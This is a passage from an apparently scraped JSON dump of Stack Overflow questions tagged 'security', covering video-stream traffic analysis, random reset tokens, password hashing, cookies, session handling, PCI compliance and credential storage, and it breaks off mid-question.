http://209.197.11.219/send/Wubmcmj7Q1T-6Tic/1 HTTP/1.1\nContent-Type: application/x-fcs\nUser-Agent: Shockwave Flash\nHost: 209.197.11.219\nContent-Length: 1537\nProxy-Connection: Keep-Alive\nPragma: no-cache\n\nHTTP/1.1 200 OK\nCache-Control: no-cache\nConnection: Keep-Alive\nContent-Length: 3074\nServer: FlashCom/3.5.5\nContent-Type: application/x-fcs\n</code></pre>\n\n<p>and these are HTTP POST requests made by shockwave flash player (plugin-containter.exe) in order:</p>\n\n<pre><code>http://fms006.lo1.hwcdn.net/fcs/ident2\nhttp://209.197.11.150/open/1\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/0\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/1\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/2\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/3\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/4\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/5\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/6\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/7\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/8\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/9\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/10\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/11\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/12\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/13\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/14\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/15\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/16\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/17\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/18\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/19\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/20\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/21\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/22\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/23\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/24\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/25\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/26\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/27\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/28\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/29\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/30\nhttp://209.197.11.150/send/2BZmcmj6mhTWexFa/31\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/32\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/33\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/34\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/35\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/36\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/37\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/38\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/39\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/40\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/41\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/42\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/43\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/44\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/45\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/46\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/47\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/48\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/49\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/50\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/51\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/52\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/53\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/54\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/55\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/56\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/57\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/58\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/59\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/60\nhttp://209.197.11.150/idle/2BZmcmj6mhTWexFa/61\n_this continues till /407..._\n</code></pre>\n\n<p>I don't get it. I'm little confused about how exactly this communication is taking place? I'm unable to find the video source. As far as I understood, from the SMIL request (browser made it) its getting the server address and then shockwaveplayer is taking over the communication and responses to these HTTP POST requests are the video in chunks. </p>\n\n<p>But how &amp; where is it identifying which video it wants? Where is RTMP? what is the url? How can I download it?</p>\n"},{"tags":["c#","security","authentication","cryptography","guid"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":212,"score":1,"question_id":12240885,"title":"Generating a unique *and* random URL in C#","body":"<p>My ultimate goal is to create a URL that is unique and cannot be guessed/predicted. The purpose of this URL is to allow users to perform operations like verifying their email address and resetting their password. These URLs would expire within a set amount of time (currently set to 24 hours).</p>\n\n<p>I was originally using a <code>Guid</code> for this purpose, but I now understand this to be somewhere between \"just fine\" and \"very insecure\", depending on which expert you listen to. So, I thought I'd beef up my code a little bit, just in case. At first I thought I'd just stick with using a <code>Guid</code>, but generate it from random bytes rather than the <code>Guid.NewGuid()</code> factory method. Here is the method I came up with:</p>\n\n<pre><code>public static Guid GetRandomGuid()\n{\n    var bytes = new byte[16];\n    var generator = new RNGCryptoServiceProvider();\n    generator.GetBytes(bytes);\n    return new Guid(bytes);\n}\n</code></pre>\n\n<p>I'm not quite clear on what exactly happens when you use <code>new Guid(bytes)</code> instead of <code>Guid.NewGuid()</code>, but I think all this method does is generate a random byte array and <em>store</em> it in a <code>Guid</code> data structure. In other words, it's no longer guaranteed to be unique, it's only guaranteed to be random.</p>\n\n<p>Since my URLs need to be both unique <em>and</em> random, this does not seem like a solid solution. I'm now thinking, I should base my URLs on a combination of both a unique ID (which could be a <code>Guid</code> or, if available, a database auto-incremented id) and a random sequence generated from <code>RNGCryptoServiceProvider</code>.</p>\n\n<p><strong>Questions</strong></p>\n\n<p>What's the best way to generate a verification/password-reset URL that is both guaranteed unique and extremely difficult/impossible to predict/guess?</p>\n\n<ul>\n<li><p>Should I simply construct my URL by concatenating a unique string with a random string?</p></li>\n<li><p>Does the .NET Framework have a built-in way to easily generate a unique <em>and</em> random (unpredictable) sequence that can be used for URLs?</p></li>\n<li><p>If not, is there a good solution available open source?</p></li>\n</ul>\n"},{"tags":[".net","security","mvc","wif"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":12655250,"title":"How can i expose pattern for a user to link two accounts together in Azure ACS and WIF (SWT tokens)","body":"<p>Right now when the user is authenticated (over Azure ACS with WIF enabled for SWT tokens) it dont look like I can let them sign in again with a new provider and get two tokens.</p>\n\n<p>im looking for a pattern that would let users link two accounts together?</p>\n"},{"tags":["php","mysql","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12769478,"title":"How can I secure my database credentials when using shared hosting and no access to outside the webroot?","body":"<p>I have all of my database credentials within an include file that I wanted to place outside of my webroot file.</p>\n\n<p>However, my shared hosting plan does not allow me to place files outside of the webroot.  Would I have to look at encrypting my file in some way to make sure my credentials are secure?</p>\n\n<p>I had read a method to produce a kind of fake 404 page, but that doesnt sound very secure to me at all.</p>\n\n<p>I've also taken the step of creating a read-only user account so that if my account is compromised then at least nothing can be overwritten or dropped, but I obviously want to be as secure as I can given the limitations.</p>\n"},{"tags":["security","rest","ssl","proxy"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12769837,"title":"Implement SSL by Proxy","body":"<p>We are writing an application which provides a RESTful API. The application needs to be secured, but I don't want my <em>Authentication/Encryption</em> mechanism to pollute the interfaced program nor the API.</p>\n\n<p>I was wondering if a Proxy could be helping in our case, but since I'm not an expert in web development, I need to know if my picture makes sense. The structure of the system should be the following:</p>\n\n<ol>\n<li><p>The server program simply exports the API on a TCP port, which however can be accessed only from a local process (bound to <code>127.0.0.1</code>);</p></li>\n<li><p>A proxy server manages SSL and Authentication:</p>\n\n<ul>\n<li>The URI and methods are exported as they are, but…</li>\n<li>Only <strong>authenticated</strong> users, having the <strong>required capabilities</strong>, can actually call them, and…</li>\n<li>The communication must be running on an encrypted channel</li>\n</ul></li>\n</ol>\n\n<p>So, my questions are:</p>\n\n<ol>\n<li><p>Is this a reasonable scenario?</p></li>\n<li><p>What is a good proxy server which I could be running for this job?</p></li>\n<li><p>Is there any drawback in doing this?</p></li>\n</ol>\n\n<p>Thanks for your help!</p>\n"},{"tags":["security","hash","passwords","salt"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12753062,"title":"Multiple Salts to protect passwords","body":"<p>If you use a salt before hashing a password - it will make the hash more secure. It makes sense, because rainbow table attacks become much more difficult (impossible?).</p>\n\n<p>What if you use multiple salts? For example - you check if the day is Monday, or the Month, the hour, etc (or some combination). Then you have a database which stores the fields: (userid, hash1, hash2, hash3...). </p>\n\n<p>Would this make the information any more (or less) secure?</p>\n\n<p>Example:</p>\n\n<p>1) User registers with password 'PASS'.\n2) System (php in this example) stores values (md5($password.$this_day)) for each day (7 passwords). into table password, column hash_monday, hash_tuesday etc.\n3) user logs in, and script checks password where 'hash_'.$this_day matches what is entered. </p>\n"},{"tags":["php","security","custom-errors","php-errors"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12768910,"title":"Programming errors in included files PHP","body":"<p>I have a common directory <code>core</code> for most important files of my PHP application. They work nice, when I call them from PHP script, but if I open it from my browses, I usually see programming errors such as </p>\n\n<pre><code>Notice: Undefined variable: current_user in S:\\rm\\core\\user-bar.php on line 1\n\nNotice: Trying to get property of non-object in S:\\rm\\core\\right-part.php on line 3 \n</code></pre>\n\n<p>Must I try to hide it, or fix it, because it can give to an attacker too much information about architecture of my application, or not?</p>\n"},{"tags":["c#","security","hash","passwords","windows-phone-7"],"answer_count":3,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":600,"score":2,"question_id":3747029,"title":"How to store passwords offline","body":"<p>Hey. \n Although this is focused on Windows Phone 7, I guess the principle is universal. I would like to have a password protected zone within my app. However, my application is completely offline and so I will have to store credential details on the phone. My initial idea is to store a hash of the password and the salt. Would this be the best way to go? If so, should the hash and salt be stored in plain text, or is there a way to ensure that even they are encrypted? I understand that having the entire scheme on the phone will eventually be cracked, but what would be the best way to raise the barrier? thanks for any suggestions</p>\n"},{"tags":["security","http","cookies","browser","web-security"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12758187,"title":"Is domain attribute of a cookie sent back to a server?","body":"<p>If evil.example.com sets a cookie with a domain attribute set to .example.com, a browser will include this cookie in requests to foo.example.com.</p>\n\n<p><a href=\"http://lcamtuf.coredump.cx/tangled/\" rel=\"nofollow\">The Tangled Web</a> notes that for foo.example.com such cookie is largely indistinguishable from cookies set by foo.example.com. But according to <a href=\"https://www.ietf.org/rfc/rfc2109.txt\" rel=\"nofollow\">the RFC</a>, the domain attribute of a cookie should be sent to the server, which would make it possible for foo.example.com to distinguish and reject a cookie that was set by evil.example.com.</p>\n\n<p>What is the state of current browsers implementations? Is domain sent back with cookies?</p>\n"},{"tags":["security","imagemagick"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12761089,"title":"How to use ImageMagick to test if received input is an image (for security purposes)?","body":"<p>Imagine an environment in which users can upload images to a website by either uploading it from their pc or referring to a remote url. </p>\n\n<p>As part of some security checks I'd like to make sure that the referenced object is indeed an image. </p>\n\n<p>In the case of a remote-url, I of course check the content-type, but this isn't bullet-proof. </p>\n\n<p>I figured I could use ImageMagick to do the task. Perhaps executing the ImageMagick.identify() method and if no error is returned and returned type is either JPG|GIF|,etc. the content is an image. (In a quick check I noticed that TXT files are identified correctly as well, so I have to blacklist these) </p>\n\n<p>Is there any better way in doing this? </p>\n"},{"tags":["security","google-app-engine","authentication"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1203,"score":3,"question_id":6711382,"title":"Google AppEngine: custom authentication","body":"<p>The way I can authenticate my users in AppEngine using Google Accounts is simply wonderful.</p>\n\n<p>However, I need to use my <strong>custom authentication-login system</strong>.</p>\n\n<p>I will have a AppUsers table, with usernames and encrypted passwords.</p>\n\n<p>I read something about sessions on gae, but I need help on starting up my app security.</p>\n\n<p>How can I track my authenticated user session? Setting a cookie?</p>\n\n<p>A beginner.</p>\n"},{"tags":["security","e-commerce","pci-dss"],"answer_count":9,"favorite_count":264,"up_vote_count":182,"down_vote_count":0,"view_count":10931,"score":182,"question_id":51094,"title":"Payment Processors - What do I need to know if I want to accept credit cards on my website?","body":"<p><a href=\"http://www.rsa.com/node.aspx?id=1156\">This question</a> talks about different payment processors and what they cost, but I'm looking for the answer to what do I need to do if I want to accept credit card payments?</p>\n\n<p>Assume I need to <em>store</em> credit card numbers for customers, so that the obvious solution of relying on the credit card processor to do the heavy lifting is not available.</p>\n\n<p><a href=\"http://www.aladdin.com/etoken/\">PCI Data Security</a>, which is apparently the standard for storing credit card info, has a bunch of general requirements, but <a href=\"http://en.wikipedia.org/wiki/PCI_DSS\">how does one implement them</a>? </p>\n\n<p>And what about the vendors, like <a href=\"http://usa.visa.com/merchants/risk_management/cisp_payment_applications.html\">Visa</a>, who have their own best practices?</p>\n\n<p>Do I need to have keyfob access to the machine? What about physically protecting it from hackers in the building?  Or even what if someone got their hands on the backup files with the sql server data files on it?</p>\n\n<p>What about backups? Are there other physical copies of that data around?</p>\n\n<p>Tip: <a href=\"http://transfs.com/blog/\">If you get a merchant account, you should negotiate that they charge you \"interchange-plus\" instead of tiered pricing.</a>  With tiered pricing, they will charge you different rates based on what type of Visa/MC is used -- ie. they charge you more for cards with big rewards attached to them.  Interchange plus billing means you only pay the processor what Visa/MC charges them, plus a flat fee.  (Amex and Discover charge their own rates directly to merchants, so this doesn't apply to those cards.  You'll find Amex rates to be in the 3% range and Discover could be as low as 1%.  Visa/MC is in the 2% range).  <a href=\"http://transfs.com/\">This service is supposed to do the negotiation for you</a> (I haven't used it, this is not an ad, and I'm not affiliated with the website, but this service is greatly needed.)</p>\n\n<p><em>This blog post gives a <a href=\"http://blog.boxedice.com/2009/05/20/taking-payments-online-merchant-account-payment-processor-fees/\">complete rundown of handling credit cards</a> (specifically for the UK).</em></p>\n\n<hr>\n\n<p>Perhaps I phrased the question wrong, but I'm looking for tips like these:</p>\n\n<ol>\n<li>Use <a href=\"http://www.rsa.com/node.aspx?id=1156\">SecurID</a> or <a href=\"http://www.aladdin.com/etoken/\">eToken</a> to add an additional password layer to the physical box.</li>\n<li>Make sure the box is in a room with a physical lock or keycode combination.</li>\n</ol>\n"},{"tags":["php","ajax","security","login","verification"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":53,"score":-1,"question_id":12755844,"title":"Tell another PHP page that the user is verified","body":"<p>I have <code>page_a.php</code>, where the user must login.</p>\n\n<p>This page, when the user successfully logs in, makes an AJAX load of <code>page_b.php</code>. However, I don't want anyone to be able to directly visit <code>page_b.php</code> without having logged in to <code>page_a.php</code> first.</p>\n\n<p>I was thinking I could use this as the URL for the AJAX load:</p>\n\n<pre><code>page_b.php?hash=xxxxx\n</code></pre>\n\n<p>then on <code>page_b.php</code> have something that checks if the hash generated by <code>page_a.php</code> was indeed generated by <code>page_a.php</code>, not copied and pasted from a previous session by somebody who looked at their web inspector.</p>\n\n<p>However I don't know how to generate a hash that <code>page_b.php</code> knows was generated by <code>page_a.php</code>. Or is there a better way to go about it?</p>\n"},{"tags":["python","string","security","unicode"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":67,"score":-1,"question_id":12756007,"title":"Fastest way to remove unsafe chars from string but keep unicode characters?","body":"<p>I recently ran a test on HackerNews inviting people to come break my web app (<a href=\"http://www.tagxt.com\" rel=\"nofollow\">www.tagxt.com</a>).</p>\n\n<p>Some people succeeded in breaking a couple things I'm trying to fix.</p>\n\n<p>The one I'm after here is:</p>\n\n<p>How do I stop people from creating usernames like <code>../../</code> and <code>../logout</code> but still let them use unicode characters like <code>☃☃☃☃☃☃</code> ? Also, the <code>_</code> underscore is ok.</p>\n\n<p>Max username length is 15 chars so performance is not a big factor but I would like to find the fastest way to remove dangerous characters.</p>\n"},{"tags":["javascript","security","backbone.js"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":216,"score":1,"question_id":11031481,"title":"Backbone.js Security","body":"<p>i am learning Backbone.js at the moment, so sorry if my question is nooby :-P</p>\n\n<p>in my program i check my data at server-side to be correct and etc ... but i was wondering what will happen if users change the data stored in models using Console in FireBug for example and try .save() or .fetch().</p>\n\n<p>is there any way to stop such actions ?</p>\n\n<p>considering all my data is going to be stored in models and can be easily retrieved by users i am not really comfortable using backbone.js, is it just me or is there something wrong here ?!</p>\n"},{"tags":["spring","security","cookies","spring-security","remember-me"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12761431,"title":"URLConnection and Spring Security PersistentTokenBasedRememberMeServices","body":"<p>I'm trying to use sitemesh to pull content together on a screen. You have to be \"logged\" into the site to view the page that site mesh is displaying and you must be logged in to view the components sitemesh is trying to pull in and decorate. </p>\n\n<p>I'm using spring security and PersistentTokenBasedRememberMeServices to do this. What happens is, when site mesh calls out to get it's components to decorate it gets the login screen provided by spring security instead of the content even though the user is logged in and has access to the page.</p>\n\n<p>Digging through the sitemesh code, site mesh is making a URL and a URLconnection to make it's calls to decorate. </p>\n\n<pre><code>URL url = new URL(this.page);\n\nURLConnection urlConn = url.openConnection();\n\nurlConn.setUseCaches(true);\n\nBufferedReader in = new BufferedReader(new InputStreamReader(urlConn.getInputStream()));\n</code></pre>\n\n<p>So I guess my question is... can I just attach the spring security token to the urlConnection like this? </p>\n\n<pre><code>URL url = new URL(page);\nURLConnection urlConn = url.openConnection();\nurlConn.setRequestProperty(\"Cookie\", myCookie);\nurlConn.setUseCaches(true);\nurlConn.connect(); \n</code></pre>\n\n<p>If so, what does the format of the cookie need to be? I've tried what is below (the gibberish is the value of the security cookie generated by spring security)</p>\n\n<pre><code>securityCookie=Y2E0cFR1WWp6RTRjTzRBSFhYaG50dz09OjR mNzlON2syVXh3M01BSXRONGV2QXc9PQ\n</code></pre>\n\n<p>It doesn't work as I get a cookie theft exception from Spring Security. Any ideas? Do I need to add the path or domain? If so what is the format?</p>\n\n<p>Does the cookie value need to be encoded in some way?</p>\n"},{"tags":["security","authentication","oauth"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":35,"score":1,"question_id":12715518,"title":"How to handle account creation and login through multiple means","body":"<h1>Authentication flow design</h1>\n\n<p>When creating a service that allows users to register and login through more than one way (facebook, twitter, local account), what is the best way to handle the account creation and validation through multiple means?</p>\n\n<h2>In Other Words</h2>\n\n<p>Imagine this situation:</p>\n\n<ul>\n<li>A user creates a normal account by sending his (or possibly anyone's) <strong>email</strong> and <strong>password</strong> (that gets hashed, etc)</li>\n<li>For <strong>convenience</strong>, the user immediately has access to their newly created account (<em>without verifying their email address</em>)</li>\n<li>A user then tries to login with an external oAuth service: Twitter, Facebook, etc</li>\n<li>When logging in with facebook, its found that an account was already created (manually) with the same email address</li>\n</ul>\n\n<h2>What is the best way to handle this?</h2>\n\n<p>I'm trying to come up with a solution that is both user-friendly (convenient) and secure, and the possible security flaws are scaring me.</p>\n\n<h2>Example</h2>\n\n<p>Using the webservice <strong>\"Mixlr\"</strong> as an example, let's see how they handle this:</p>\n\n<ul>\n<li><strong>I</strong> create an account with <strong>YOUR</strong> email address (sucks for you)</li>\n<li>Mixlr instantly logs me in and lets me start using their service (that's convenient)</li>\n<li>They also send me an email to verify my account (even though I'm already using it)</li>\n<li><strong>YOU</strong> decide that you want to join Mixlr, so you create an account.... but instead of using the classic registration process, you opt to use <strong>Facebook</strong> to create your Mixlr account</li>\n<li>Interestingly, <strong>Facebook</strong> sends you back the same email address that <strong>I</strong> used to create <strong>MY</strong> account</li>\n<li>Mixlr decides to \"merge\" the accounts, simply adding your <strong>Facebook</strong> account as a new \"connected account\" in their service</li>\n</ul>\n\n<h2>Therein lies the problem</h2>\n\n<p>If <strong>I'm</strong> still logged in, using the service, I technically have some small control over <strong>YOUR</strong>  <strong>Facebook</strong> account....</p>\n\n<p>Isn't that insecure... and frankly, a little sketchy?</p>\n\n<p>Mixlr, however, doesn't let the user log in a \"second\" time without the user verifying/confirming their email address.</p>\n\n<p>Essentially, I don't know what the middle ground is for convenience and security, without first requiring a user to verify their email address during registration.</p>\n"},{"tags":["security","cookies","login"],"answer_count":3,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":80,"score":2,"question_id":12758277,"title":"user  login security - local cookie vs sessions","body":"<p>I've read a few answers here about this topic, and people say that using sessions is more secure that using only cookie, but I don't see how can that be true.</p>\n\n<p>Let's say you're using sessions, and on the client's computer only the session ID is stored. If a hacker gains access to the client's computer and steals the session ID cookie, he practically gains access to the client's account on my site, right?</p>\n\n<p>Now if you're using only local cookies, and store like a hashed portion of the the clients password + combined with a salt that only your server knows, a hacker can still gain access to his account by stealing his cookie from his PC.</p>\n\n<p>So in the end there's no difference between the two methods, right? Or am I missing something ?</p>\n"},{"tags":["ruby","web-services","security","soa","http-authentication"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12759813,"title":"SOA - Signature Authorization Service - how to make the web interface to access user data","body":"<p>I've designed a REST Authorization Service that works pretty much like the <a href=\"http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html\" rel=\"nofollow\">Amazon S3 REST Authentication</a> and it's secure enough to work on HTTP (without requiring the overhead to make all intercomunications run on SSL).</p>\n\n<p>It's secure enough because the signature changes at each request and is subject to expiration. So it's safe against MITM (that cannot edit anything otherwise the endpoint won't be able to regenerate the same signature) and replay attacks (because of the timestamp usage).</p>\n\n<p>That's good for all clients, that knowing the private key, now can perform requested actions on their own data generating a unique signature containing the request data.</p>\n\n<p>The authorization service doesn't generate any token (so it cannot be subject to MITM attacks) and it is only called internally, meaning that a client performs a request directly to the right endpoint to perform certain operations, instead of requesting a token to give that service... then the endpoint receiving that request makes a query to the authorization service asking \"hey, is this requested legit?\" if so the authorization service returns \"200 OK\" and the service performs requested operations, otherwise it returns \"401 Unauthorized\".</p>\n\n<p>What I need now is to allow a special client, a web user interface, to make users login using email/password and use the webUI itself to obtain/edit their data. The webUI will run on HTTPS. Please, consider that creating a new account generates always both user/pwd login and pubkey/privatekey, but actually we're only using pubkey/privatekey. User and pwd are stored inside a db that will be used only by the WebUI, while the pubkey/privatekey is stored inside the Authorization Service (that uses another DB).</p>\n\n<p>Of course to work with customer data I need some way to make the webUI act as it is a client written for the logged user (that has a pubkey/privatekey associated pair to generate the signature). I'm not sure what's the safest way to do this so I'm going to explain several solutions I tought about.</p>\n\n<p>The 1st solution I tought is give the web interface its own pubkey/privatekey, making it a real client, and then edit the authorization service to recognize it and allow it to send the publickey (that can be retrieved by the authorization service) using a header like \"X-Forwarded-For\") and always trust the webUI authority. But I'm scared that somehow I'm missing something that could lead to attacks to exploit this authority to obtain the data you are not authorized for.</p>\n\n<p>The second solution would be, once logged in successfully, transfer both pubkey/privatekey from the Authorization Service to the WebUI that then stores it inside the session, and each time an action is performed it uses that data to generate a valid signature. But I don't really like to pass those data over network (also because this communication should be at least over SSL to avoid the privatekey to be sniffed), and I don't really like to have the private key stored inside a session backend.</p>\n\n<p>The last solution I tought about is rethink the authorization service and also allow authentication by user and password (that will be no more stored inside the webUI but togheter with pubkey/privatekey inside the Authorization Service). This would always require a SSL connection because the webui has to communicate email and password, but if logged correctly it could only store those data inside the session created. Another side effect would be that other services could be implemented to use user/pwd instead of using the signature method, that over HTTP would mean expose data to the world.</p>\n\n<p>I want the strongest and more logical solution, that makes the webUI act as a client because the entire architecture is thought to work on a client-server basis. I'm also available to accept other suggestions not listed here.</p>\n\n<p>Please, tell me if you need to know more to help me.</p>\n\n<p>Thank you (if you've read the whole post :-P)</p>\n"},{"tags":["sql-server","security","sql-server-ce","database-connection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12758067,"title":"How can I protect the password for an encrypted SQL Server Compact database?","body":"<p>I have found a few resources that tell me causing a SQL Compact DB to be encrypted is as simple as specifying a password in the connection string. But, I am not comfortable leaving that password in my web.config file. I know I can supply a connection string for a DbContext dynamically, at runtime, but even there, I'm still including a plain text password in the connection string. How can I minimise points in my code where this password is vulnerable?</p>\n"},{"tags":["security","file","encryption"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12758922,"title":"How to prevent access of users to read and extract my binary files","body":"<p>I have set of binary data files among one of my applications and for security issues I should encrypt and decrypt files for every use. This is quite well but the process is killing. I use Blowfish to perform ciphering and it's really slow in both functions. I can understand that if someone wants to extract my data from the binary files, he/she should have a recognition about my file pattern but I'm afraid that would be nothing hard to guess.</p>\n\n<p>Is there any way to lock access for users to read binary files with use of encryption or other things?</p>\n"},{"tags":[".net","security","file-upload"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12353889,"title":"How to prevent anonymous file uploads from HTML Forms","body":"<p>There is a major security breach in one of our company's websites. The website is built on C#, ASP.Net and IIS 7. There are some hackers who are able to upload files from the login form from the website's home page. There are no other forms on the website and only the index page is visible to the users. </p>\n\n<p>When I check the server logs, there is no anonymous access from Remote Desktop or FTP. So I think the hackers are uploading files from the login form only. We have setup the firewall which restricts user access to certain countries, but when I see server log, still people from those restricted countries are able to access that page and these files are coming from those countries only.</p>\n\n<p>The server which we are using is a dedicated server. The customer support could not provide sufficient help in fixing this issue.</p>\n\n<p>Can someone please throw a light over whats happening here and how I can prevent it.</p>\n"},{"tags":["mysql","security","postgresql","ssh","database-connection"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":156,"score":1,"question_id":10161566,"title":"How to easily and safely connect to postgres or mysql remotely?","body":"<p>I would like to know how can you connect to postgresql in these conditions:</p>\n\n<ul>\n<li>allow you to access them from any location (do IP filtering)</li>\n<li>safe connection (no risk on having your password captured)</li>\n<li>easy to setup, preferably having to configure only the server for that.</li>\n</ul>\n\n<p>I know that the recommended approach is to used SSH port forwarding, but this requires you to start the port forwarding before trying to connect to these databases. </p>\n\n<p>What is the easiest method to acquire a good enough security without having to do complex setup on the client. </p>\n\n<p>Is there a way to auto enable the port forwarding stuff on demand?</p>\n"},{"tags":["javascript","html","security","http-headers"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":82,"score":2,"question_id":12756936,"title":"Security Concerns with window.location.href","body":"<p>After reading a Wikipedia article about URL redirection I'm wondering if <code>window.location.href=\"page.php\"</code> is the best option for a web page redirect. The wikipedia article suggests that</p>\n\n<blockquote>\n  <p>However, HTTP headers or the refresh meta tag may be preferred for security reasons and because JavaScript will not be executed by some browsers and many web crawlers.</p>\n</blockquote>\n\n<p>Is there anything I have to worry about? What could be some alternatives using javascipt if there is a problem? The window.location.href is activated when the user logs in.</p>\n"},{"tags":["flash","security","xss","cross-domain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":671,"score":1,"question_id":1922373,"title":"What policy is enforced by an \"empty\" crossdomain.xml?","body":"<p>What policy would be enforced by the following crossdomain.xml that contains no allow statements.</p>\n\n<pre><code>&lt;cross-domain-policy&gt;\n  &lt;site-control permitted-cross-domain-policies=\"all\"/&gt;\n&lt;/cross-domain-policy&gt;\n</code></pre>\n\n<p>Does this implicitly deny or accept everything?</p>\n"},{"tags":["html","security","web-applications","user-interface","user-experience"],"answer_count":6,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":675,"score":3,"question_id":5601234,"title":"To captcha or not to captcha","body":"<p>I would like to know what do you think about adding captcha mechanisms to registration forms?</p>\n\n<p>I notice that many sites don't use captcha mechanisms in their registration forms(examples: <a href=\"http://djdesignerlab.com/2010/04/14/25-cool-sign-up-and-login-form-designs/\" rel=\"nofollow\">http://djdesignerlab.com/2010/04/14/25-cool-sign-up-and-login-form-designs/</a>). </p>\n\n<p>I would like to open this topic to see what people thinks.</p>\n\n<p>I always thought that we should make our forms as secured as possible, but from another point of view there are many users out there that don't really have to much patience to fill a captcha at a registration page. </p>\n\n<p>-Do you think adding this mechanism to a registration page can drastically drop the amount of registered users at long term?</p>\n\n<p>-How dangerous can it be not including this mechanism at a registration page?</p>\n"},{"tags":["sql-server-2008","security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":42,"score":0,"question_id":12753777,"title":"What hashing algorithm does SQL Server 2008 R2 use for the sa password?","body":"<p>I think it's 